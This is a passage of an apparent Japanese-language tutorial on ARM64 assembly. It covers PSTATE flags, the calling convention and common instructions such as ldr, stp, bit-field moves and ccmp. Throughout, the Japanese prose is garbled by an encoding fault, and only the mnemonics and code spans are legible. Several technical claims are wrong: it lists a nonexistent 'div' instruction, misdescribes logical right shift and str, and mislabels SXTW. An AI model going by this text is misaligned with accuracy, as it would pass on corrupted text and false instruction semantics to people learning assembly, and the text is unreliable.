* ç¾åœ¨ã®**ãƒ¬ã‚¸ã‚¹ã‚¿å¹… (`nRW`)** ãƒ•ãƒ©ã‚°ï¼šãƒ•ãƒ©ã‚°ãŒå€¤ 0 ã‚’ä¿æŒã—ã¦ã„ã‚‹å ´åˆã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯å†é–‹å¾Œã« AArch64 å®Ÿè¡ŒçŠ¶æ…‹ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
* ç¾åœ¨ã®**ä¾‹å¤–ãƒ¬ãƒ™ãƒ«** (**`EL`**)ï¼šEL0 ã§å®Ÿè¡Œã•ã‚Œã‚‹é€šå¸¸ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯å€¤ 0 ã‚’æŒã¡ã¾ã™
* **ã‚·ãƒ³ã‚°ãƒ«ã‚¹ãƒ†ãƒƒãƒ—** ãƒ•ãƒ©ã‚° (**`SS`**)ï¼šãƒ‡ãƒãƒƒã‚¬ãŒ **`SPSR_ELx`** å†…ã® SS ãƒ•ãƒ©ã‚°ã‚’ 1 ã«è¨­å®šã—ã¦ã‚·ãƒ³ã‚°ãƒ«ã‚¹ãƒ†ãƒƒãƒ—ã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã‚¹ãƒ†ãƒƒãƒ—ã‚’å®Ÿè¡Œã—ã€ã‚·ãƒ³ã‚°ãƒ«ã‚¹ãƒ†ãƒƒãƒ—ä¾‹å¤–ã‚’ç™ºè¡Œã—ã¾ã™ã€‚
* **ä¸æ­£ä¾‹å¤–** çŠ¶æ…‹ãƒ•ãƒ©ã‚° (**`IL`**)ï¼šç‰¹æ¨©ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãŒç„¡åŠ¹ãªä¾‹å¤–ãƒ¬ãƒ™ãƒ«è»¢é€ã‚’å®Ÿè¡Œã™ã‚‹ã¨ãã«ãƒãƒ¼ã‚¯ã•ã‚Œã€ã“ã®ãƒ•ãƒ©ã‚°ãŒ 1 ã«è¨­å®šã•ã‚Œã€ãƒ—ãƒ­ã‚»ãƒƒã‚µã¯ä¸æ­£ãªçŠ¶æ…‹ä¾‹å¤–ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚
* **`DAIF`** ãƒ•ãƒ©ã‚°ï¼šã“ã‚Œã‚‰ã®ãƒ•ãƒ©ã‚°ã«ã‚ˆã‚Šã€ç‰¹æ¨©ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒç‰¹å®šã®å¤–éƒ¨ä¾‹å¤–ã‚’é¸æŠçš„ã«ãƒã‚¹ã‚¯ã§ãã¾ã™ã€‚
* **`A`** ãŒ 1 ã®å ´åˆã€**éåŒæœŸä¸­æ–­** ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚**`I`** ã¯å¤–éƒ¨ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ **å‰²ã‚Šè¾¼ã¿ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ï¼ˆIRQï¼‰ã«å¿œç­”ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã•ã‚Œã€F ã¯ **Fast Interrupt Requests**ï¼ˆFIRsï¼‰ã«é–¢é€£ã—ã¦ã„ã¾ã™ã€‚
* **ã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿é¸æŠ** ãƒ•ãƒ©ã‚° (**`SPS`**)ï¼šEL1 ãŠã‚ˆã³ãã‚Œä»¥ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ç‰¹æ¨©ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã€è‡ªåˆ†è‡ªèº«ã®ã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿ãƒ¬ã‚¸ã‚¹ã‚¿ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¢ãƒ‡ãƒ«ã®ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆãŸã¨ãˆã° `SP_EL1` ã¨ `EL0` ã®é–“ï¼‰ã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®åˆ‡ã‚Šæ›¿ãˆã¯ã€**`SPSel`** ç‰¹æ®Šãƒ¬ã‚¸ã‚¹ã‚¿ã«æ›¸ãè¾¼ã‚€ã“ã¨ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ EL0 ã‹ã‚‰ã¯è¡Œãˆã¾ã›ã‚“ã€‚

## **å‘¼ã³å‡ºã—è¦ç´„ï¼ˆARM64v8ï¼‰**

ARM64 å‘¼ã³å‡ºã—è¦ç´„ã§ã¯ã€é–¢æ•°ã¸ã®æœ€åˆã® 8 ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€**`x0` ã‹ã‚‰ `x7`** ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ¸¡ã•ã‚Œã¾ã™ã€‚**è¿½åŠ **ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯**ã‚¹ã‚¿ãƒƒã‚¯**ã«æ¸¡ã•ã‚Œã¾ã™ã€‚**æˆ»ã‚Šå€¤** ã¯ã€ãƒ¬ã‚¸ã‚¹ã‚¿ **`x0`** ã«è¿”ã•ã‚Œã‚‹ã‹ã€**128 ãƒ“ãƒƒãƒˆã®å ´åˆã¯** **`x1`** ã«ã‚‚è¿”ã•ã‚Œã¾ã™ã€‚**`x19`** ã‹ã‚‰ **`x30`** ãŠã‚ˆã³ **`sp`** ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ã€é–¢æ•°å‘¼ã³å‡ºã—ã‚’è¶…ãˆã¦**ä¿å­˜**ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã‚¢ã‚»ãƒ³ãƒ–ãƒªã§é–¢æ•°ã‚’èª­ã‚€éš›ã«ã¯ã€**é–¢æ•°ã®ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°ã¨ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°**ã‚’æ¢ã—ã¾ã™ã€‚**ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°** ã¯é€šå¸¸ã€**ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ (`x29`) ã‚’ä¿å­˜**ã—ã€**æ–°ã—ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’è¨­å®š**ã—ã€**ã‚¹ã‚¿ãƒƒã‚¯ã‚¹ãƒšãƒ¼ã‚¹ã‚’å‰²ã‚Šå½“ã¦**ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚**ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°** ã¯é€šå¸¸ã€**ä¿å­˜ã•ã‚ŒãŸãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’å¾©å…ƒ**ã—ã€é–¢æ•°ã‹ã‚‰**æˆ»ã‚‹**ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚

### Swift ã«ãŠã‘ã‚‹å‘¼ã³å‡ºã—è¦ç´„

Swift ã«ã¯ç‹¬è‡ªã®**å‘¼ã³å‡ºã—è¦ç´„**ãŒã‚ã‚Šã€[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## **ä¸€èˆ¬çš„ãªå‘½ä»¤ï¼ˆARM64v8ï¼‰**

ARM64 å‘½ä»¤ã¯ä¸€èˆ¬çš„ã«ã€`opcode dst, src1, src2` ã®å½¢å¼ã‚’æŒã¡ã€**`opcode`** ã¯å®Ÿè¡Œã•ã‚Œã‚‹**æ“ä½œ**ï¼ˆ`add`ã€`sub`ã€`mov` ãªã©ï¼‰ã‚’ã€**`dst`** ã¯çµæœãŒæ ¼ç´ã•ã‚Œã‚‹**å®›å…ˆ**ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ã€**`src1`** ãŠã‚ˆã³ **`src2`** ã¯**ã‚½ãƒ¼ã‚¹**ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ç¤ºã—ã¾ã™ã€‚ã‚½ãƒ¼ã‚¹ãƒ¬ã‚¸ã‚¹ã‚¿ã®ä»£ã‚ã‚Šã«å³å€¤ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

* **`mov`**: 1 ã¤ã®**ãƒ¬ã‚¸ã‚¹ã‚¿**ã‹ã‚‰åˆ¥ã®**ãƒ¬ã‚¸ã‚¹ã‚¿**ã«å€¤ã‚’**ç§»å‹•**ã—ã¾ã™ã€‚
* ä¾‹: `mov x0, x1` â€” ã“ã‚Œã¯ `x1` ã‹ã‚‰ `x0` ã«å€¤ã‚’ç§»å‹•ã—ã¾ã™ã€‚
* **`ldr`**: **ãƒ¡ãƒ¢ãƒª**ã‹ã‚‰**å€¤**ã‚’**ãƒ¬ã‚¸ã‚¹ã‚¿**ã«**ãƒ­ãƒ¼ãƒ‰**ã—ã¾ã™ã€‚
* ä¾‹: `ldr x0, [x1]` â€” ã“ã‚Œã¯ `x1` ãŒæŒ‡ã™ãƒ¡ãƒ¢ãƒªä½ç½®ã‹ã‚‰ `x0` ã«å€¤ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
* **ã‚ªãƒ•ã‚»ãƒƒãƒˆãƒ¢ãƒ¼ãƒ‰**: ã‚ªãƒªãƒ³ãƒã‚¤ãƒ³ã‚¿ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ã‚ªãƒ•ã‚»ãƒƒãƒˆãŒç¤ºã•ã‚Œã¾ã™ã€‚ä¾‹:
* `ldr x2, [x1, #8]` ã¯ã€x1 + 8 ã®å€¤ã‚’ x2 ã«ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™
* `ldr x2, [x0, x1, lsl #2]` ã¯ã€x0 ã®é…åˆ—ã‹ã‚‰ã€ä½ç½® x1ï¼ˆã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ï¼‰ \* 4 ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ x2 ã«ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™
* **ãƒ—ãƒªã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ãƒ¢ãƒ¼ãƒ‰**: ã“ã‚Œã¯ã€å…ƒã«è¨ˆç®—ã‚’é©ç”¨ã—ã€çµæœã‚’å–å¾—ã—ã¦æ–°ã—ã„å…ƒã‚’å…ƒã«æ ¼ç´ã—ã¾ã™ã€‚
* `ldr x2, [x1, #8]!` ã¯ã€`x1 + 8` ã‚’ `x2` ã«ãƒ­ãƒ¼ãƒ‰ã—ã€`x1 + 8` ã®çµæœã‚’ `x1` ã«æ ¼ç´ã—ã¾ã™
* `str lr, [sp, #-4]!` ã¯ã€ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ sp ã«æ ¼ç´ã—ã€ãƒ¬ã‚¸ã‚¹ã‚¿ sp ã‚’æ›´æ–°ã—ã¾ã™
* **ãƒã‚¹ãƒˆã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ãƒ¢ãƒ¼ãƒ‰**: ã“ã‚Œã¯å‰ã®ãƒ¢ãƒ¼ãƒ‰ã¨åŒæ§˜ã§ã™ãŒã€ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‹ã‚‰ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¨ˆç®—ã—ã¦æ ¼ç´ã—ã¾ã™ã€‚
* `ldr x0, [x1], #8` ã¯ã€`x1` ã‚’ `x0` ã«ãƒ­ãƒ¼ãƒ‰ã—ã€`x1 + 8` ã§ x1 ã‚’æ›´æ–°ã—ã¾ã™
* **PCç›¸å¯¾ã‚¢ãƒ‰ãƒ¬ãƒƒã‚·ãƒ³ã‚°**: ã“ã®å ´åˆã€ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ PC ãƒ¬ã‚¸ã‚¹ã‚¿ã«å¯¾ã—ã¦ç›¸å¯¾çš„ã«è¨ˆç®—ã•ã‚Œã¾ã™
* `ldr x1, =_start` ã¯ã€`_start` ã‚·ãƒ³ãƒœãƒ«ãŒé–‹å§‹ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã€ç¾åœ¨ã® PC ã«é–¢é€£ã—ã¦ x1 ã«ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
* **`str`**: **ãƒ¡ãƒ¢ãƒª**ã‹ã‚‰**ãƒ¬ã‚¸ã‚¹ã‚¿**ã«**å€¤**ã‚’**æ ¼ç´**ã—ã¾ã™ã€‚
* ä¾‹: `str x0, [x1]` â€” ã“ã‚Œã¯ `x0` ã®å€¤ã‚’ `x1` ãŒæŒ‡ã™ãƒ¡ãƒ¢ãƒªä½ç½®ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`ldp`**: **2 ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿**ã‚’**é€£ç¶šã™ã‚‹ãƒ¡ãƒ¢ãƒª**ä½ç½®ã‹ã‚‰**ãƒ­ãƒ¼ãƒ‰**ã—ã¾ã™ã€‚é€šå¸¸ã€ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€åˆ¥ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã«ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¿½åŠ ã—ã¦å½¢æˆã•ã‚Œã¾ã™ã€‚
* ä¾‹: `ldp x0, x1, [x2]` ã¯ã€ãã‚Œãã‚Œ `x2` ã¨ `x2 + 8` ã®ãƒ¡ãƒ¢ãƒªä½ç½®ã‹ã‚‰ `x0` ã¨ `x1` ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
* **`stp`**: **2 ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿**ã‚’**é€£ç¶šã™ã‚‹ãƒ¡ãƒ¢ãƒª**ä½ç½®ã«**æ ¼ç´**ã—ã¾ã™ã€‚é€šå¸¸ã€ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€åˆ¥ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã«ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¿½åŠ ã—ã¦å½¢æˆã•ã‚Œã¾ã™ã€‚
* ä¾‹: `stp x0, x1, [sp]` ã¯ã€ãã‚Œãã‚Œ `sp` ã¨ `sp + 8` ã®ãƒ¡ãƒ¢ãƒªä½ç½®ã« `x0` ã¨ `x1` ã‚’æ ¼ç´ã—ã¾ã™ã€‚
* `stp x0, x1, [sp, #16]!` ã¯ã€ãã‚Œãã‚Œ `sp+16` ã¨ `sp + 24` ã®ãƒ¡ãƒ¢ãƒªä½ç½®ã« `x0` ã¨ `x1` ã‚’æ ¼ç´ã—ã€`sp` ã‚’ `sp+16` ã«æ›´æ–°ã—ã¾ã™ã€‚
* **`add`**: 2 ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’åŠ ç®—ã—ã€çµæœã‚’ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚
* æ§‹æ–‡: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> å®›å…ˆ
* Xn2 -> ã‚ªãƒšãƒ©ãƒ³ãƒ‰1
* Xn3 | #imm -> ã‚ªãƒšãƒ©ãƒ³ãƒ‰2ï¼ˆãƒ¬ã‚¸ã‚¹ã‚¿ã¾ãŸã¯å³å€¤ï¼‰
* \[shift #N | RRX] -> ã‚·ãƒ•ãƒˆã¾ãŸã¯RRXã‚’å®Ÿè¡Œ
* ä¾‹: `add x0, x1, x2` â€” ã“ã‚Œã¯`x1`ã¨`x2`ã®å€¤ã‚’åŠ ç®—ã—ã€çµæœã‚’`x0`ã«æ ¼ç´ã—ã¾ã™ã€‚
* `add x5, x5, #1, lsl #12` â€” ã“ã‚Œã¯4096ã«ç­‰ã—ã„ï¼ˆ1ã‚’12å›ã‚·ãƒ•ãƒˆï¼‰ -> 1 0000 0000 0000 0000
* **`adds`** ã“ã‚Œã¯`add`ã‚’å®Ÿè¡Œã—ã€ãƒ•ãƒ©ã‚°ã‚’æ›´æ–°ã—ã¾ã™
* **`sub`**: 2ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’å¼•ãç®—ã—ã€çµæœã‚’ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`add`** **æ§‹æ–‡**ã‚’ç¢ºèªã—ã¾ã™ã€‚
* ä¾‹: `sub x0, x1, x2` â€” ã“ã‚Œã¯`x1`ã‹ã‚‰`x2`ã®å€¤ã‚’å¼•ãã€çµæœã‚’`x0`ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`subs`** ã“ã‚Œã¯subã¨åŒã˜ã§ã™ãŒã€ãƒ•ãƒ©ã‚°ã‚’æ›´æ–°ã—ã¾ã™
* **`mul`**: 2ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’**æ›ã‘ç®—**ã—ã€çµæœã‚’ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚
* ä¾‹: `mul x0, x1, x2` â€” ã“ã‚Œã¯`x1`ã¨`x2`ã®å€¤ã‚’æ›ã‘ç®—ã—ã€çµæœã‚’`x0`ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`div`**: 1ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’ã‚‚ã†1ã¤ã§å‰²ã‚Šã€çµæœã‚’ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚
* ä¾‹: `div x0, x1, x2` â€” ã“ã‚Œã¯`x1`ã‚’`x2`ã§å‰²ã‚Šã€çµæœã‚’`x0`ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **è«–ç†å·¦ã‚·ãƒ•ãƒˆ**: æœ«å°¾ã«0ã‚’è¿½åŠ ã—ã€ä»–ã®ãƒ“ãƒƒãƒˆã‚’å‰ã«ç§»å‹•ã—ã¾ã™ï¼ˆnå›2ã‚’æ›ã‘ã‚‹ï¼‰
* **è«–ç†å³ã‚·ãƒ•ãƒˆ**: å…ˆé ­ã«1ã‚’è¿½åŠ ã—ã€ä»–ã®ãƒ“ãƒƒãƒˆã‚’å¾Œã‚ã«ç§»å‹•ã—ã¾ã™ï¼ˆç¬¦å·ãªã—ã®å ´åˆã¯nå›2ã§å‰²ã‚‹ï¼‰
* **ç®—è¡“å³ã‚·ãƒ•ãƒˆ**: **`lsr`**ã¨åŒæ§˜ã§ã™ãŒã€æœ€ä¸Šä½ãƒ“ãƒƒãƒˆãŒ1ã®å ´åˆã¯0ã‚’è¿½åŠ ã™ã‚‹ä»£ã‚ã‚Šã«ã€1ã‚’è¿½åŠ ã—ã¾ã™ï¼ˆç¬¦å·ä»˜ãã®å ´åˆã¯nå›2ã§å‰²ã‚‹ï¼‰
* **å³ã«å›è»¢**: **`lsr`**ã¨åŒæ§˜ã§ã™ãŒã€å³ã‹ã‚‰å‰Šé™¤ã•ã‚ŒãŸã‚‚ã®ã¯å·¦ã«è¿½åŠ ã•ã‚Œã¾ã™
* **æ‹¡å¼µä»˜ãå³å›è»¢**: **`ror`**ã¨åŒæ§˜ã§ã™ãŒã€ã‚­ãƒ£ãƒªãƒ¼ãƒ•ãƒ©ã‚°ã‚’ã€Œæœ€ä¸Šä½ãƒ“ãƒƒãƒˆã€ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ã‚­ãƒ£ãƒªãƒ¼ãƒ•ãƒ©ã‚°ã¯ãƒ“ãƒƒãƒˆ31ã«ç§»å‹•ã—ã€å‰Šé™¤ã•ã‚ŒãŸãƒ“ãƒƒãƒˆã¯ã‚­ãƒ£ãƒªãƒ¼ãƒ•ãƒ©ã‚°ã«ç§»å‹•ã—ã¾ã™ã€‚
* **`bfm`**: **ãƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ç§»å‹•**ã€ã“ã‚Œã‚‰ã®æ“ä½œã¯å€¤ã‹ã‚‰ãƒ“ãƒƒãƒˆ`0...n`ã‚’ã‚³ãƒ”ãƒ¼ã—ã€ãã‚Œã‚‰ã‚’ä½ç½®`m..m+n`ã«é…ç½®ã—ã¾ã™ã€‚**`#s`**ã¯**å·¦ç«¯ã®ãƒ“ãƒƒãƒˆ**ä½ç½®ã‚’æŒ‡å®šã—ã€**`#r`**ã¯**å³ã«å›è»¢ã™ã‚‹é‡**ã‚’æŒ‡å®šã—ã¾ã™ã€‚
* ãƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ç§»å‹•: `BFM Xd, Xn, #r`
* ç¬¦å·ä»˜ããƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ç§»å‹•: `SBFM Xd, Xn, #r, #s`
* ç¬¦å·ãªã—ãƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ç§»å‹•: `UBFM Xd, Xn, #r, #s`
* **ãƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®æŠ½å‡ºã¨æŒ¿å…¥:** ãƒ¬ã‚¸ã‚¹ã‚¿ã‹ã‚‰ãƒ“ãƒƒãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ã‚³ãƒ”ãƒ¼ã—ã€åˆ¥ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
* **`BFI X1, X2, #3, #4`** X2ã‹ã‚‰X1ã®3ç•ªç›®ã®ãƒ“ãƒƒãƒˆã«4ãƒ“ãƒƒãƒˆã‚’æŒ¿å…¥ã—ã¾ã™
* **`BFXIL X1, X2, #3, #4`** X2ã®3ç•ªç›®ã®ãƒ“ãƒƒãƒˆã‹ã‚‰4ãƒ“ãƒƒãƒˆã‚’æŠ½å‡ºã—ã€ãã‚Œã‚‰ã‚’X1ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™
* **`SBFIZ X1, X2, #3, #4`** X2ã‹ã‚‰4ãƒ“ãƒƒãƒˆã‚’ç¬¦å·æ‹¡å¼µã—ã€å³å´ã®ãƒ“ãƒƒãƒˆã‚’ã‚¼ãƒ­ã«ã—ã¦X1ã®ãƒ“ãƒƒãƒˆä½ç½®3ã‹ã‚‰æŒ¿å…¥ã—ã¾ã™
* **`SBFX X1, X2, #3, #4`** X2ã‹ã‚‰ãƒ“ãƒƒãƒˆ3ã‹ã‚‰å§‹ã¾ã‚‹4ãƒ“ãƒƒãƒˆã‚’æŠ½å‡ºã—ã€ç¬¦å·æ‹¡å¼µã—ã¦çµæœã‚’X1ã«é…ç½®ã—ã¾ã™
* **`UBFIZ X1, X2, #3, #4`** X2ã‹ã‚‰4ãƒ“ãƒƒãƒˆã‚’ã‚¼ãƒ­æ‹¡å¼µã—ã€å³å´ã®ãƒ“ãƒƒãƒˆã‚’ã‚¼ãƒ­ã«ã—ã¦X1ã®ãƒ“ãƒƒãƒˆä½ç½®3ã‹ã‚‰æŒ¿å…¥ã—ã¾ã™
* **`UBFX X1, X2, #3, #4`** X2ã‹ã‚‰å§‹ã¾ã‚‹4ãƒ“ãƒƒãƒˆã‚’æŠ½å‡ºã—ã€ã‚¼ãƒ­æ‹¡å¼µã•ã‚ŒãŸçµæœã‚’X1ã«é…ç½®ã—ã¾ã™ã€‚
* **Xã«ç¬¦å·æ‹¡å¼µ**: å€¤ã®ç¬¦å·ã‚’æ‹¡å¼µã—ã¾ã™ï¼ˆã¾ãŸã¯ç¬¦å·ãªã—ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯å˜ã«0ã‚’è¿½åŠ ã—ã¾ã™ï¼‰:
* **`SXTB X1, W2`** ãƒã‚¤ãƒˆã®ç¬¦å·ã‚’æ‹¡å¼µã—ã¾ã™ **W2ã‹ã‚‰X1** (`W2`ã¯`X2`ã®åŠåˆ†) 64ãƒ“ãƒƒãƒˆã‚’åŸ‹ã‚ã‚‹ãŸã‚
* **`SXTH X1, W2`** 16ãƒ“ãƒƒãƒˆæ•°ã®ç¬¦å·ã‚’æ‹¡å¼µã—ã¾ã™ **W2ã‹ã‚‰X1** 64ãƒ“ãƒƒãƒˆã‚’åŸ‹ã‚ã‚‹ãŸã‚
* **`SXTW X1, W2`** ãƒã‚¤ãƒˆã®ç¬¦å·ã‚’æ‹¡å¼µã—ã¾ã™ **W2ã‹ã‚‰X1** 64ãƒ“ãƒƒãƒˆã‚’åŸ‹ã‚ã‚‹ãŸã‚
* **`UXTB X1, W2`** ãƒã‚¤ãƒˆã«0ã‚’è¿½åŠ ã—ã¾ã™ï¼ˆç¬¦å·ãªã—ï¼‰ **W2ã‹ã‚‰X1** 64ãƒ“ãƒƒãƒˆã‚’åŸ‹ã‚ã‚‹ãŸã‚
* **`extr`:** æŒ‡å®šã•ã‚ŒãŸ**é€£çµã•ã‚ŒãŸãƒ¬ã‚¸ã‚¹ã‚¿ã®ãƒ“ãƒƒãƒˆ**ã‹ã‚‰ãƒ“ãƒƒãƒˆã‚’æŠ½å‡ºã—ã¾ã™ã€‚
* ä¾‹: `EXTR W3, W2, W1, #3` ã“ã‚Œã¯**W1+W2**ã‚’é€£çµã—ã€**W2ã®ãƒ“ãƒƒãƒˆ3ã‹ã‚‰W1ã®ãƒ“ãƒƒãƒˆ3ã¾ã§**ã‚’å–å¾—ã—ã¦W3ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`cmp`**: 2ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’æ¯”è¼ƒã—ã€æ¡ä»¶ãƒ•ãƒ©ã‚°ã‚’è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã¯`subs`ã®ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã§ã€å®›å…ˆãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ã‚¼ãƒ­ãƒ¬ã‚¸ã‚¹ã‚¿ã«è¨­å®šã—ã¾ã™ã€‚`m == n`ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚
* åŒã˜**`subs`**ã®æ§‹æ–‡ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¾ã™
* ä¾‹: `cmp x0, x1` â€” ã“ã‚Œã¯`x0`ã¨`x1`ã®å€¤ã‚’æ¯”è¼ƒã—ã€æ¡ä»¶ãƒ•ãƒ©ã‚°ã‚’é©åˆ‡ã«è¨­å®šã—ã¾ã™ã€‚
* **`cmn`**: **è² ã®æ¯”è¼ƒ**ã‚ªãƒšãƒ©ãƒ³ãƒ‰ã€‚ã“ã®å ´åˆã€`adds`ã®ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã§ã€åŒã˜æ§‹æ–‡ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¾ã™ã€‚`m == -n`ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚
* **`ccmp`**: æ¡ä»¶ä»˜ãæ¯”è¼ƒã€å‰ã®æ¯”è¼ƒãŒçœŸã®å ´åˆã«ã®ã¿å®Ÿè¡Œã•ã‚Œã€ç‰¹å®šã®nzcvãƒ“ãƒƒãƒˆã‚’è¨­å®šã—ã¾ã™ã€‚
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2ã‹ã¤x3 < x4ã®å ´åˆã€funcã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™
* ã“ã‚Œã¯**å‰ã®`cmp`ãŒ`NE`ã ã£ãŸå ´åˆã«ã®ã¿`ccmp`ãŒå®Ÿè¡Œ**ã•ã‚Œã‚‹ãŸã‚ã§ã™ã€‚ãã†ã§ãªã„å ´åˆã€ãƒ“ãƒƒãƒˆ`nzcv`ã¯0ã«è¨­å®šã•ã‚Œã¾ã™ï¼ˆã“ã‚Œã¯`blt`ã®æ¯”è¼ƒã‚’æº€ãŸã—ã¾ã›ã‚“ï¼‰ã€‚
* ã“ã‚Œã¯`ccmn`ã¨ã—ã¦ã‚‚ä½¿ç”¨ã§ãã¾ã™ï¼ˆ`cmp`ã¨`cmn`ã®ã‚ˆã†ã«ï¼‰ã€‚
